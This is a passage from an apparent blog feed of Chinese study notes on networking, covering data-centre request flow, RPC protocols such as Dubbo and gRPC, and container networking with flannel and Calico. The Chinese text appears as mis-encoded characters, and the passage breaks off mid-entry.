    <content type="html"><![CDATA[<h3 id="å¹³å°æ­å»ºï¼š"><a href="#å¹³å°æ­å»ºï¼š" class="headerlink" title="å¹³å°æ­å»ºï¼š"></a>å¹³å°æ­å»ºï¼š</h3><h4 id="1ã€æ•°æ®ä¸­å¿ƒ"><a href="#1ã€æ•°æ®ä¸­å¿ƒ" class="headerlink" title="1ã€æ•°æ®ä¸­å¿ƒ"></a>1ã€æ•°æ®ä¸­å¿ƒ</h4><p>æ•°æ®ä¸­å¿ƒä¸€èˆ¬ç”±å¤šä¸ªå¯ç”¨åŒºç»„æˆï¼Œæ¯ä¸ªå¯ç”¨åŒºåŒ…å«å¤šä¸ªæœºæˆ¿ï¼Œæ¯ä¸ªæœºæˆ¿åˆåŒ…å«ä¸€ç‰‡ä¸€ç‰‡çš„æœºæŸœï¼Œæ¯ä¸ªæœºæŸœä¸Šæ”¾ç½®æœåŠ¡å™¨ï¼ŒæœºæŸœæœ‰æ¥å…¥äº¤æ¢æœºï¼Œç”±æ±‡èšäº¤æ¢æœºç›¸è¿ï¼›æ¯å°æœåŠ¡å™¨ä¸Šç”±Open vSwitchåˆ›å»ºè™šæ‹Ÿäº¤æ¢æœºå¹¶è¿›è¡Œè¿æ¥ç®¡ç†ï¼ŒåŒæ—¶ä½¿ç”¨VPCï¼ˆè™šæ‹Ÿç§æœ‰ç½‘ç»œï¼‰è¿›è¡Œè™šæ‹Ÿæœºçš„ç½‘ç»œç®¡ç†ã€‚æ¥ä¸‹æ¥ä¸ºäº†åº”å¯¹ä¸šåŠ¡éœ€æ±‚ï¼Œå°±éœ€è¦æ•°æ®åº“å¯¹æ•°æ®è¿›è¡ŒæŒä¹…åŒ–ä¿å­˜ï¼Œç¼“å­˜å‡è½»æ•°æ®åº“è¯»å†™å‹åŠ›ï¼Œè´Ÿè½½å‡è¡¡ã€CDNç­‰æ–¹å¼å‡è½»æœåŠ¡å™¨å‹åŠ›æå‡ç”¨æˆ·è®¿é—®ä½“éªŒç­‰ã€‚</p><h4 id="2ã€å¤–ç½‘IPå¹¿æ’­"><a href="#2ã€å¤–ç½‘IPå¹¿æ’­" class="headerlink" title="2ã€å¤–ç½‘IPå¹¿æ’­"></a>2ã€å¤–ç½‘IPå¹¿æ’­</h4><p>è¾¹ç•Œè·¯ç”±å™¨é€šè¿‡BGPåè®®ï¼Œå°†æ•°æ®ä¸­å¿ƒç­‰å¤–ç½‘IPå¯¹å¤–å¹¿æ’­ï¼Œç”±å…¶ä»–è¿è¥å•†ç­‰è·¯ç”±å™¨è¿›è¡Œè·¯ç”±ä¿¡æ¯è®°å½•ï¼›</p><h4 id="3ã€åŸŸåè§£æ"><a href="#3ã€åŸŸåè§£æ" class="headerlink" title="3ã€åŸŸåè§£æ"></a>3ã€åŸŸåè§£æ</h4><p>éç§»åŠ¨ç«¯è®¾å¤‡çš„åŸŸåè§£æè¯·æ±‚å…¨è¿‡ç¨‹ä¸ºæœ¬åœ°hostsæ–‡ä»¶ã€æœ¬åœ°DNSè§£æç¼“å­˜ã€æœ¬åœ°DNSæœåŠ¡å™¨ã€æ ¹DNSæœåŠ¡å™¨ã€é¡¶çº§DNSæœåŠ¡å™¨ã€æƒå¨DNSæœåŠ¡å™¨ï¼›ç§»åŠ¨ç«¯ä¸€èˆ¬ä½¿ç”¨HTTPDNSæœåŠ¡ï¼Œç›´æ¥è°ƒç”¨HTTPDNSæœåŠ¡å™¨ï¼Œè·å–åˆ°å¯¹åº”åˆ°å…¬ç½‘IPã€‚</p><h4 id="4ã€é™æ€èµ„æºCDN"><a href="#4ã€é™æ€èµ„æºCDN" class="headerlink" title="4ã€é™æ€èµ„æºCDN"></a>4ã€é™æ€èµ„æºCDN</h4><p>é™æ€èµ„æºä¸€èˆ¬ä¿å­˜åœ¨nginxåç­‰varnishç¼“å­˜ï¼Œå¯¹äºä¸å¸¸æ›´æ–°çš„é™æ€å›¾ç‰‡ç­‰ä¼šä¿å­˜åœ¨å¯¹è±¡å­˜å‚¨é‡Œï¼Œå¹¶é…ç½®CDNï¼Œä¸‹å‘åˆ°è¾¹ç¼˜èŠ‚ç‚¹ã€‚æœ¬åœ° DNS æœåŠ¡å™¨å»è¯·æ±‚ CDN çš„å…¨å±€è´Ÿè½½å‡è¡¡å™¨è§£æåŸŸåï¼Œå…¨å±€è´Ÿè½½å‡è¡¡å™¨ä¼šä¸ºç”¨æˆ·é€‰æ‹©ä¸€å°åˆé€‚çš„ç¼“å­˜æœåŠ¡å™¨æä¾›æœåŠ¡ï¼Œå°† IP è¿”å›ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å»è®¿é—®è¿™ä¸ªè¾¹ç¼˜èŠ‚ç‚¹ï¼Œä¸‹è½½èµ„<br>æºã€‚ç¼“å­˜æœåŠ¡å™¨å“åº”ç”¨æˆ·è¯·æ±‚ï¼Œå°†ç”¨æˆ·æ‰€éœ€å†…å®¹ä¼ é€åˆ°ç”¨æˆ·ç»ˆç«¯ã€‚å¦‚æ— ç”¨æˆ·æ‰€è¦å†…å®¹ï¼Œåˆ™ä¼šå‘ä¸Šçº§è¯·æ±‚ï¼Œç›´è‡³è¿½æº¯è‡³æ„¿æœåŠ¡å™¨ã€‚</p><h4 id="5ã€å»ºç«‹è¿æ¥"><a href="#5ã€å»ºç«‹è¿æ¥" class="headerlink" title="5ã€å»ºç«‹è¿æ¥"></a>5ã€å»ºç«‹è¿æ¥</h4><p>HTTPæ˜¯åŸºäºTCPè¿æ¥çš„ï¼Œç”¨æˆ·è®¿é—®éœ€è¦å…ˆé€šè¿‡TCPä¸‰æ¬¡æ¡æ‰‹å»ºç«‹TCPè¿æ¥ï¼Œå¹¶å„è‡ªåœ¨TCPå±‚ä¼šæ™¤ä¸€ä¸ªè¿æ¥çš„çŠ¶æ€æœºã€‚å»ºç«‹å®ŒTCPè¿æ¥åï¼Œä¼šè¿›è¡ŒHTTPSè¿æ¥å»ºç«‹ï¼ŒåŒæ–¹åå•†TLSç‰ˆæœ¬ã€åŠ å¯†å’Œå‹ç¼©ç®—æ³•ï¼ŒéªŒè¯è¯ä¹¦ï¼Œç„¶ååˆ›å»ºå¯¹ç§°å¯†é’¥ç”¨äºä¼ è¾“åŠ å¯†ã€‚HTTPSé‡‡ç”¨éå¯¹ç§°åŠ å¯†çš„æ–¹å¼ä¼ è¾“å¯†é’¥ï¼Œå¯¹ç§°åŠ å¯†çš„æ–¹å¼ä¼ è¾“æ•°æ®ï¼Œè§£å†³äº†å¯†é’¥ä¼ è¾“çš„å®‰å…¨é—®é¢˜ï¼ŒåŒæ—¶ä¹Ÿæé«˜äº†æ•°æ®ä¼ è¾“çš„æ•ˆç‡ã€‚</p><h4 id="6ã€ç½‘ç»œä¼ è¾“"><a href="#6ã€ç½‘ç»œä¼ è¾“" class="headerlink" title="6ã€ç½‘ç»œä¼ è¾“"></a>6ã€ç½‘ç»œä¼ è¾“</h4><p>HTTPç½‘ç»œæŠ¥æ–‡ä¸»è¦åŒ…æ‹¬è¯·æ±‚è¡Œã€è¯·æ±‚å¤´éƒ¨ã€è¯·æ±‚æ­£æ–‡ï¼Œç”±æµè§ˆå™¨æˆ–è€…HTTPå®¢æˆ·ç«¯å°è£…ä¼ é€’ç»™ä¼ è¾“å±‚ï¼›åœ¨TCPå±‚ä¼šæŠŠæŠ¥æ–‡å°è£…æˆä¸€ä¸ªä¸ªæŠ¥æ–‡æ®µï¼Œå¹¶é™„åŠ ä¸ŠTCPå¤´éƒ¨ï¼ŒTCPå¤´éƒ¨åŒ…å«æºç›®çš„ç«¯å£å·ï¼Œå‘é€ç»™ç½‘ç»œå±‚ï¼›IPå±‚ä¼šé™„åŠ ä¸ŠIPå¤´éƒ¨ï¼ŒåŒ…å«æºç›®IPåœ°å€ç­‰ä¿¡æ¯ï¼Œå°†æŠ¥æ–‡æ®µå°è£…ä¸ºç½‘ç»œåŒ…ï¼Œæ ¹æ®è·¯ç”±ä¿¡æ¯ï¼Œå‘é€å¾€å¯¹åº”ç­‰ç½‘å…³ã€‚æ­¤æ—¶ä¼šæ ¹æ®ARPåè®®è·å–ä¸‹ä¸€è·³IPçš„macåœ°å€ï¼Œå°†ä¸‹ä¸€è·³çš„MACä½œä¸ºç›®æ ‡åœ°å€ï¼Œæ”¾å…¥MACå¤´éƒ¨å°è£…ï¼Œé€šè¿‡äº¤æ¢æœºå‘é€ã€‚</p><h4 id="7ã€æµæ§æ‹¥å¡ä¸é‡ä¼ "><a href="#7ã€æµæ§æ‹¥å¡ä¸é‡ä¼ " class="headerlink" title="7ã€æµæ§æ‹¥å¡ä¸é‡ä¼ "></a>7ã€æµæ§æ‹¥å¡ä¸é‡ä¼ </h4><p>ç½‘ç»œåŒ…ä¼ è¾“é“¾è·¯å¤æ‚ï¼Œå®¹æ˜“äº§ç”Ÿæ‹¥å¡å’Œä¸¢åŒ…ç°è±¡ï¼Œéœ€è¦ä¾é TCPåè®®å¯¹åŒ…è¿›è¡Œé‡ä¼ ï¼Œå¹¶é€šè¿‡TCPçš„æ»‘åŠ¨çª—å£åè®®è¿›è¡Œä¼ è¾“æ§åˆ¶ã€‚</p><h4 id="8ã€NAT"><a href="#8ã€NAT" class="headerlink" title="8ã€NAT"></a>8ã€NAT</h4><p>ç½‘ç»œåŒ…åˆ°è¾¾ç›®æ ‡å…¬ç½‘IPåï¼Œç”±äºMACåœ°å€å’ŒIPåœ°å€åŒ¹é…ï¼Œç½‘ç»œåŒ…å³å°†è¿›å…¥æ•°æ®ä¸­å¿ƒå†…éƒ¨ï¼Œç”±è™šæ‹Ÿç½‘å…³èŠ‚ç‚¹åˆ°NATè§„åˆ™å°†å…¬ç½‘IPè½¬æ¢ä¸ºVPCå†…å¯¹åº”åˆ°ç§ç½‘IPï¼Œåœ¨ç”±å†…éƒ¨è·¯ç”±ä¼ é€’åˆ°å¯¹åº”åˆ°æœåŠ¡å™¨ä¸Šï¼Œå®é™…ä¸Šä¸æ­¢NATï¼Œç«¯å£ä¹Ÿä¼šå¯¹åº”åˆ°è¿›è¡ŒNATè½¬æ¢ï¼Œè¿™æ ·æ•°æ®åŒ…æ‰èƒ½ä¼ é€’åˆ°å¯¹åº”åˆ°æœåŠ¡ä¸Šè¿›è¡Œå¤„ç†ã€‚</p><h4 id="9ã€RPCè°ƒç”¨"><a href="#9ã€RPCè°ƒç”¨" class="headerlink" title="9ã€RPCè°ƒç”¨"></a>9ã€RPCè°ƒç”¨</h4><p>ç½‘ç»œåŒ…åˆ°è¾¾ç‰©ç†æœºAåï¼ŒOVS ä¼šå°†åŒ…ä» VXLAN éš§é“é‡Œé¢è§£å‡ºæ¥ï¼Œå‘ç»™ HAProxy æ‰€åœ¨çš„è™šæ‹Ÿæœºã€‚HAProxy æ‰€åœ¨çš„è™šæ‹Ÿæœºå‘ç° MAC åœ°å€åŒ¹é…ï¼Œç›®æ ‡ IP åœ°å€åŒ¹é…ï¼Œå°±æ ¹æ® TCP ç«¯å£ï¼Œå°†åŒ…å‘ç»™HAProxy è¿›ç¨‹ï¼Œå› ä¸º HAProxy æ˜¯åœ¨ç›‘å¬è¿™ä¸ª TCP ç«¯å£çš„ã€‚HAProxyæ˜¯å››å±‚è´Ÿè½½ï¼Œä¼šå°†è¯·æ±‚è½¬å‘ç»™åç«¯çš„controllerå±‚ï¼Œè¿™ä¸ªåŒ…å‘å‡ºå»ä¹‹åï¼Œè¿˜æ˜¯ä¼šè¢«ç‰©ç†æœºä¸Šçš„ OVS æ”¾å…¥ VXLAN éš§é“é‡Œé¢ï¼ŒOVS ä¼šå°†åŒ…ä» VXLAN éš§é“é‡Œé¢è§£å‡ºæ¥ï¼Œå‘ç»™ Controller å±‚æ‰€åœ¨çš„è™šæ‹Ÿæœºã€‚ç”±controllerå±‚å¤„ç†å…·ä½“httpè¯·æ±‚ã€‚</p><h4 id="10ã€HTTPè¯·æ±‚å¤„ç†"><a href="#10ã€HTTPè¯·æ±‚å¤„ç†" class="headerlink" title="10ã€HTTPè¯·æ±‚å¤„ç†"></a>10ã€HTTPè¯·æ±‚å¤„ç†</h4><p>Controller å±‚ä¼šé€šè¿‡ RPC è°ƒç”¨è¿™ä¸ªHTTPè¯·æ±‚åŒ…å«çš„æœåŠ¡å±‚ï¼Œä»¥Dubboä¸ºä¾‹ï¼šController å±‚éœ€è¦è¯»å–æ³¨å†Œä¸­å¿ƒï¼Œå°†å…·ä½“HTTPè¯·æ±‚çš„æœåŠ¡çš„è¿›ç¨‹åˆ—è¡¨æ‹¿å‡ºæ¥ï¼Œé€‰å‡ºä¸€ä¸ªæ¥è°ƒç”¨ã€‚Dubbo ä¸­é»˜è®¤çš„ RPC åè®®æ˜¯ Hessian2ã€‚Hessian2 å°†ä¸‹å•çš„è¿œç¨‹è°ƒç”¨åºåˆ—åŒ–ä¸ºäºŒè¿›åˆ¶è¿›è¡Œä¼ è¾“ã€‚è°ƒç”¨çš„æ—¶å€™ï¼Œç»Ÿä¸€ä½¿ç”¨ Hessian2 è¿›è¡Œåºåˆ—åŒ–ï¼Œä½¿ç”¨ Netty è¿›è¡Œä¼ è¾“ï¼Œåº•å±‚å¦‚æœè·¨ç‰©ç†æœºï¼Œä»ç„¶éœ€è¦é€šè¿‡ VXLAN çš„å°è£…å’Œè§£å°è£…ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œ</category>
      
      <category>ç½‘ç»œä¸²è®²</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç½‘ç»œ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€Šè¶£è°ˆç½‘ç»œåè®®ã€‹å­¦ä¹ æ€»ç»“ï¼š32-36è®²</title>
    <link href="/2020/11/14/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A32-36%E8%AE%B2/"/>
    <url>/2020/11/14/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A32-36%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="RPCåè®®ï¼š"><a href="#RPCåè®®ï¼š" class="headerlink" title="RPCåè®®ï¼š"></a>RPCåè®®ï¼š</h3><p>1ã€åè®®çº¦å®šé—®é¢˜ï¼šæœ€æ—©çš„ RPC çš„ä¸€ç§å®ç°æ–¹å¼ç§°ä¸º Sun RPC æˆ– ONC RPCã€‚è¿™ä¸ª RPC æ¡†æ¶æ˜¯åœ¨ NFS åè®®ä¸­ä½¿ç”¨çš„ã€‚æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯éƒ½æ˜¯ä»¥RPCRuntimeæ”¶å‘è¯·æ±‚ï¼Œä½¿ç”¨Stubè§£ç ã€‚é€šè¿‡æ¡†æ¶è§„å®šè¿œç¨‹è°ƒç”¨çš„è¯­æ³•ã€ä¼ é€’å‚æ•°å’Œæ•°æ®è¡¨ç¤ºï¼›<br>2ã€ä¼ è¾“é—®é¢˜ï¼šä½¿ç”¨ONC RPCç±»åº“ï¼Œå¤„ç†è¿æ¥å¤±è´¥ã€é‡è¯•ã€å‘é€å¤±è´¥ã€è¶…æ—¶ç­‰åœºæ™¯ï¼›<br>3ã€æœåŠ¡å‘ç°é—®é¢˜ï¼šONC RPCä¸­ï¼Œé€šè¿‡portmapperè¿›è¡ŒæœåŠ¡å‘ç°ã€‚RPCç¨‹åºå¯åŠ¨æ—¶ï¼Œä¼šå‘port mapperæ³¨å†Œï¼Œå®¢æˆ·ç«¯è®¿é—®æœåŠ¡æ—¶ï¼Œå…ˆæŸ¥è¯¢portmapperï¼Œè·å–RPCæœåŠ¡ç«¯å£ï¼Œå†å»ºç«‹è¿æ¥ï¼Œå‘èµ·è°ƒç”¨ã€‚</p><h3 id="åŸºäºXMLçš„SOAPï¼ˆç®€å•å¯¹è±¡è®¿é—®ï¼‰åè®®ï¼š"><a href="#åŸºäºXMLçš„SOAPï¼ˆç®€å•å¯¹è±¡è®¿é—®ï¼‰åè®®ï¼š" class="headerlink" title="åŸºäºXMLçš„SOAPï¼ˆç®€å•å¯¹è±¡è®¿é—®ï¼‰åè®®ï¼š"></a>åŸºäºXMLçš„SOAPï¼ˆç®€å•å¯¹è±¡è®¿é—®ï¼‰åè®®ï¼š</h3><p>åŸæ¥çš„äºŒè¿›åˆ¶ RPC æœ‰å¾ˆå¤šç¼ºç‚¹ï¼Œæ ¼å¼è¦æ±‚ä¸¥æ ¼ï¼Œä¿®æ”¹è¿‡äºå¤æ‚ï¼Œä¸é¢å‘å¯¹è±¡ï¼Œäºæ˜¯äº§ç”Ÿäº†åŸºäºæ–‡æœ¬çš„è°ƒç”¨æ–¹å¼â€”â€”åŸºäº XML çš„ SOAPã€‚<br>SOAP æœ‰ä¸‰å¤§è¦ç´ ï¼šåè®®çº¦å®šç”¨ WSDLã€ä¼ è¾“åè®®ç”¨ HTTPã€æœåŠ¡å‘ç°ç”¨ UDDLã€‚</p><h3 id="åŸºäºJSONçš„RESTfulæ¥å£åè®®ï¼š"><a href="#åŸºäºJSONçš„RESTfulæ¥å£åè®®ï¼š" class="headerlink" title="åŸºäºJSONçš„RESTfulæ¥å£åè®®ï¼š"></a>åŸºäºJSONçš„RESTfulæ¥å£åè®®ï¼š</h3><p>RESTful ä¸ä»…ä»…æ˜¯ä¸€ä¸ª APIï¼Œè€Œä¸”æ˜¯ä¸€ç§æ¶æ„æ¨¡å¼ï¼Œä¸»è¦é¢å‘èµ„æºï¼Œæä¾›æ— çŠ¶æ€æœåŠ¡ï¼Œæœ‰åˆ©äºæ¨ªå‘æ‰©å±•åº”å¯¹é«˜å¹¶å‘ã€‚<br>åŸºäº RESTful API çš„è·¨ç³»ç»Ÿè°ƒç”¨æ¡†æ¶Spring Cloudå°±æ˜¯ä½¿ç”¨Eurekaè¿›è¡ŒæœåŠ¡æ³¨å†Œå‘ç°çš„ã€‚</p><h3 id="äºŒè¿›åˆ¶ç±»RPCåè®®-dubboï¼š"><a href="#äºŒè¿›åˆ¶ç±»RPCåè®®-dubboï¼š" class="headerlink" title="äºŒè¿›åˆ¶ç±»RPCåè®®-dubboï¼š"></a>äºŒè¿›åˆ¶ç±»RPCåè®®-dubboï¼š</h3><p>Dubboç”¨äºæç¤ºæœåŠ¡é—´è°ƒç”¨çš„æ€§èƒ½ã€‚ é€šè¿‡æ³¨å†Œä¸­å¿ƒè§£å†³æœåŠ¡å‘ç°é—®é¢˜ï¼Œé€šè¿‡ Hessian2 åºåˆ—åŒ–è§£å†³åè®®çº¦å®šçš„é—®é¢˜ï¼Œé€šè¿‡ Netty è§£å†³ç½‘ç»œä¼ è¾“çš„é—®é¢˜ã€‚<br>1ã€Dubbo ä¸­é»˜è®¤çš„ RPC åè®®æ˜¯ Hessian2ã€‚ä¸ºäº†ä¿è¯ä¼ è¾“çš„æ•ˆç‡ï¼ŒHessian2 å°†è¿œç¨‹è°ƒç”¨åºåˆ—åŒ–ä¸ºäºŒè¿›åˆ¶è¿›è¡Œä¼ è¾“ï¼Œå¹¶ä¸”å¯ä»¥è¿›è¡Œä¸€å®šçš„å‹ç¼©ã€‚<br>2ã€Netty æ˜¯ä¸€ä¸ªéé˜»å¡çš„åŸºäºäº‹ä»¶çš„ç½‘ç»œä¼ è¾“æ¡†æ¶ï¼Œåœ¨æœåŠ¡ç«¯å¯åŠ¨çš„æ—¶å€™ï¼Œä¼šç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œå¹¶æ³¨å†Œä¸€äº›è¿æ¥å’Œè¯·æ±‚æ—¶é—´ã€‚</p><h3 id="è·¨è¯­è¨€ç±»RPCåè®®ï¼š"><a href="#è·¨è¯­è¨€ç±»RPCåè®®ï¼š" class="headerlink" title="è·¨è¯­è¨€ç±»RPCåè®®ï¼š"></a>è·¨è¯­è¨€ç±»RPCåè®®ï¼š</h3><p>GRPC æ˜¯ä¸€ç§äºŒè¿›åˆ¶ï¼Œæ€§èƒ½å¥½ï¼Œè·¨è¯­è¨€ï¼Œè¿˜çµæ´»ï¼ŒåŒæ—¶å¯ä»¥è¿›è¡ŒæœåŠ¡æ²»ç†çš„å¤šå¿«å¥½çœçš„RPC æ¡†æ¶ï¼Œå”¯ä¸€ä¸è¶³å°±æ˜¯è¿˜æ˜¯è¦å†™åè®®æ–‡ä»¶ã€‚<br>GRPC åºåˆ—åŒ–ä½¿ç”¨ Protocol Buffersï¼Œç½‘ç»œä¼ è¾“ä½¿ç”¨ HTTP 2.0ï¼ŒæœåŠ¡æ²»ç†å¯ä»¥ä½¿ç”¨åŸºäºEnvoy çš„ Service Meshã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œ</category>
      
      <category>RPCåè®®</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç½‘ç»œ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€Šè¶£è°ˆç½‘ç»œåè®®ã€‹å­¦ä¹ æ€»ç»“ï¼š28-31è®²</title>
    <link href="/2020/11/14/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A29-31%E8%AE%B2/"/>
    <url>/2020/11/14/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A29-31%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="å®¹å™¨ç½‘ç»œï¼š"><a href="#å®¹å™¨ç½‘ç»œï¼š" class="headerlink" title="å®¹å™¨ç½‘ç»œï¼š"></a>å®¹å™¨ç½‘ç»œï¼š</h3><p>ç¯å¢ƒéš”ç¦»æŠ€æœ¯ï¼š1ï¼‰å‘½åç©ºé—´ï¼ˆnamespaceï¼‰ï¼›2ï¼‰æœºåˆ¶ç½‘ç»œï¼ˆcgroupï¼‰<br>å‘½åç©ºé—´ï¼ˆnamespaceï¼‰ï¼šæ¯ä¸ªnamespace ä¸­çš„åº”ç”¨çœ‹åˆ°çš„æ˜¯ä¸åŒçš„ IP åœ°å€ã€ç”¨æˆ·ç©ºé—´ã€ç¨‹å·ç­‰ã€‚<br>æœºåˆ¶ç½‘ç»œï¼ˆcgroupï¼‰ï¼šcgroup å…¨ç§° control groupsï¼Œæ˜¯ Linux å†…æ ¸æä¾›çš„ä¸€ç§å¯ä»¥é™åˆ¶ã€éš”ç¦»è¿›ç¨‹ä½¿ç”¨çš„èµ„æºæœºåˆ¶ã€‚åŒ…å«å¾ˆå¤šå­ç³»ç»Ÿï¼š<br>CPU å­ç³»ç»Ÿä½¿ç”¨è°ƒåº¦ç¨‹åºä¸ºè¿›ç¨‹æ§åˆ¶ CPU çš„è®¿é—®ï¼›<br>cpusetï¼Œå¦‚æœæ˜¯å¤šæ ¸å¿ƒçš„ CPUï¼Œè¿™ä¸ªå­ç³»ç»Ÿä¼šä¸ºè¿›ç¨‹åˆ†é…å•ç‹¬çš„ CPU å’Œå†…å­˜ï¼›<br>memory å­ç³»ç»Ÿï¼Œè®¾ç½®è¿›ç¨‹çš„å†…å­˜é™åˆ¶ä»¥åŠäº§ç”Ÿå†…å­˜èµ„æºæŠ¥å‘Šï¼›<br>blkio å­ç³»ç»Ÿï¼Œè®¾ç½®é™åˆ¶æ¯ä¸ªå—è®¾å¤‡çš„è¾“å…¥è¾“å‡ºæ§åˆ¶ï¼›<br>net_clsï¼Œè¿™ä¸ªå­ç³»ç»Ÿä½¿ç”¨ç­‰çº§è¯†åˆ«ç¬¦ï¼ˆclassidï¼‰æ ‡è®°ç½‘ç»œæ•°æ®åŒ…ï¼Œå¯å…è®¸ Linux æµé‡æ§åˆ¶<br>ç¨‹åºï¼ˆtcï¼‰è¯†åˆ«ä»å…·ä½“ cgroup ä¸­ç”Ÿæˆçš„æ•°æ®åŒ…ã€‚</p><h4 id="å®¹å™¨ä¸å®¿ä¸»æœºé€šä¿¡ï¼š"><a href="#å®¹å™¨ä¸å®¿ä¸»æœºé€šä¿¡ï¼š" class="headerlink" title="å®¹å™¨ä¸å®¿ä¸»æœºé€šä¿¡ï¼š"></a>å®¹å™¨ä¸å®¿ä¸»æœºé€šä¿¡ï¼š</h4><p>åœ¨ Linux ä¸‹ï¼Œå¯ä»¥åˆ›å»ºä¸€å¯¹ veth pair çš„ç½‘å¡ï¼Œä¸€ç«¯ç»‘å®šdockerç½‘æ¡¥ï¼Œä¸€æ®µç»‘å®šnamespaceï¼Œå®ç°é€šä¿¡ï¼›</p><h4 id="å®¹å™¨è®¿é—®å¤–ç½‘ï¼š"><a href="#å®¹å™¨è®¿é—®å¤–ç½‘ï¼š" class="headerlink" title="å®¹å™¨è®¿é—®å¤–ç½‘ï¼š"></a>å®¹å™¨è®¿é—®å¤–ç½‘ï¼š</h4><p>NATæ¨¡å¼ï¼šSNAT</p><h4 id="å¤–ç½‘è®¿é—®å®¹å™¨æœåŠ¡ï¼š"><a href="#å¤–ç½‘è®¿é—®å®¹å™¨æœåŠ¡ï¼š" class="headerlink" title="å¤–ç½‘è®¿é—®å®¹å™¨æœåŠ¡ï¼š"></a>å¤–ç½‘è®¿é—®å®¹å™¨æœåŠ¡ï¼š</h4><p>1ï¼‰docker-proxyï¼šæ¯”å¦‚ç›‘å¬10080ç«¯å£ï¼Œè½¬æ¢ä¸º80ç«¯å£<br>2ï¼‰DNATï¼šåœ¨ -A PREROUTING é˜¶æ®µåŠ ä¸€ä¸ªè§„åˆ™ï¼Œå°†åˆ°ç«¯å£ 10080çš„ DNAT ç§°ä¸ºå®¹å™¨çš„ç§æœ‰ç½‘ç»œã€‚</p><h3 id="è·¨èŠ‚ç‚¹å®¹å™¨ç½‘ç»œæ–¹æ¡ˆâ€”â€”flannelï¼š"><a href="#è·¨èŠ‚ç‚¹å®¹å™¨ç½‘ç»œæ–¹æ¡ˆâ€”â€”flannelï¼š" class="headerlink" title="è·¨èŠ‚ç‚¹å®¹å™¨ç½‘ç»œæ–¹æ¡ˆâ€”â€”flannelï¼š"></a>è·¨èŠ‚ç‚¹å®¹å™¨ç½‘ç»œæ–¹æ¡ˆâ€”â€”flannelï¼š</h3><p>åŸºäº NAT çš„å®¹å™¨ç½‘ç»œæ¨¡å‹åœ¨å¾®æœåŠ¡æ¶æ„ä¸‹æœ‰ä¸¤ä¸ªé—®é¢˜ï¼Œä¸€ä¸ªæ˜¯ IP é‡å ï¼Œä¸€ä¸ªæ˜¯ç«¯å£å†²çªï¼Œéœ€è¦é€šè¿‡ Overlay ç½‘ç»œçš„æœºåˆ¶ä¿æŒè·¨èŠ‚ç‚¹çš„è¿é€šæ€§ã€‚<br>flannelä½¿ç”¨UDPå®ç°Overlayï¼š<br>æ¯ä¸€å°ç‰©ç†æœºä¸Šè¿è¡Œä¸€ä¸ªflannelè¿›ç¨‹ï¼Œåˆ›å»ºå‡ºä¸€ä¸ªflannel.1ç½‘å¡ï¼Œæ‰€æœ‰å‘åˆ°è¯¥ç½‘å¡çš„åŒ…ä¼šè¢«flannelè¿›ç¨‹å°è£…åœ¨UDPåŒ…é‡Œï¼Œå¤–å±‚åŠ ä¸Šæºã€ç›®ç‰©ç†æœºIPï¼Œå‘é€ç»™ç›®çš„ç‰©ç†æœºä¸Šçš„flannelè¿›ç¨‹å¤„ç†ï¼Œæ‹†å°UDPåŒ…ï¼Œé€šè¿‡ç›®çš„ç‰©ç†æœºçš„flannel.1ç½‘å¡å‘é€å‡ºå»ã€‚ç”±äºæ˜¯ç”¨æˆ·æ€å¯¹æ•°æ®åŒ…è¿›è¡Œå°è£…ï¼Œä¼šæœ‰æ€§èƒ½æŸè€—ã€‚<br>flannelä½¿ç”¨VXLANå®ç°Overlayï¼š<br>é€šè¿‡å†…æ ¸netlinkæœºåˆ¶åˆ›å»ºä¸€ä¸ªVTEPç½‘å¡flannel.1ï¼Œç‰©ç†æœºAå°†æ•°æ®åŒ…å‘é€åˆ°flannel.1è¿›è¡Œå°è£…ï¼Œè½¬å‘åˆ°ç‰©ç†æœºBçš„flannel.1ç½‘å¡è¿›è¡Œè§£åŒ…ï¼Œå˜æˆå†…éƒ¨ç½‘ç»œåŒ…ï¼Œå†é€šè¿‡ç‰©ç†æœºç½‘æ¡¥è½¬å‘åˆ°å®¹å™¨Bå†…éƒ¨ï¼› VXLAN åœ¨å†…æ ¸æ€å°è£…ï¼Œ æ€§èƒ½æ›´å¥½ä¸€äº›ã€‚</p><h3 id="å®¹å™¨ç½‘ç»œâ€”â€”Calicoï¼š"><a href="#å®¹å™¨ç½‘ç»œâ€”â€”Calicoï¼š" class="headerlink" title="å®¹å™¨ç½‘ç»œâ€”â€”Calicoï¼š"></a>å®¹å™¨ç½‘ç»œâ€”â€”Calicoï¼š</h3><p>è®¾è®¡æ€è·¯ï¼šä¸ä¾èµ–Overlayç½‘ç»œï¼Œä¸å¼•å…¥é¢å¤–çš„ç½‘ç»œæŸè€—ï¼Œåˆ©ç”¨ç‰©ç†æœºåšè·¯ç”±å™¨ï¼Œä½¿ç”¨ä¸‰å±‚ç½‘ç»œçš„è·¯ç”±è½¬å‘å®ç°å®¹å™¨é—´é€šä¿¡ã€‚<br>Calicoç»„ä»¶ï¼š<br>è·¯ç”±é…ç½®ç»„ä»¶ï¼šæ¯å°ç‰©ç†æœºä¸Šæœ‰ä¸€ä¸ª 